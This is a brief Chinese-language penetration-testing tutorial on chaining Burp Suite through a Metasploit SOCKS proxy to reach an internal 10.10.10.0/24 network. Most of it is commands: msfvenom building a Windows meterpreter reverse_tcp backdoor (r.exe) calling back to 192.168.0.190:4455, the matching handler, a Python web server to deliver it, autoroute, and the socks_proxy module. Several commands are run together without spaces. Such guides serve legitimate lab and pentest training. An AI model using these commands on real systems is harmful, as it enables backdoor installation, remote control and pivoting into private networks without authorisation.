burpsuite设置上游代理访问内网

在实际环境中,使用msf设置代理跨网段访问时，用的是socks4a模块现在的最新版本的msf这个工具已经把socks4a模块集合到socks模块里面。

代理的通信经过流程

本地

127.0.0.1:8080 ->localhost:25378->192.168.0.190 :1080->10.10.10.130:80

首先生成后门

msfvenom-p windows/meterpreter/reverse_tcp lhost=192.168.0.190  lport=4455 -fexe >r.exe

设置msf监听模块

msfconsoleuse exploit/multi/handler set payload windows/meterpreter/reverse_tcpset lhost 192.168.0.190set lport 4455exploit


设置web服务器

sudo python -m SimpleHTTPServer 80

设置路由

run autoroute -s 10.10.10.0/24

使用socks_proxy模块

backgroupduseauxiliary/server/socks_proxysetversion 4arun
